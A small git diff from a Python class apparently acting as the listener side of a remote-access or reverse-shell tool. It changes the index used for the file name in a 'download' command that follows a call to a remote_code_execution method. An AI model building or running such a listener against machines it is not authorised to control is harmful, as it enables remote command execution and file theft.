@@ -51,7 +51,7 @@ class Connections_Listener:
                     input_command.append(content)
                 result = self.remote_code_execution(input_command)
                 if input_command[0].lower() == 'download':
-                    result = self.download_file(input_command[1], result.encode('utf-8'))
+                    result = self.download_file(input_command[-1], result.encode('utf-8'))
             except Exception as error:
                 print(error)
                 print(type(error))
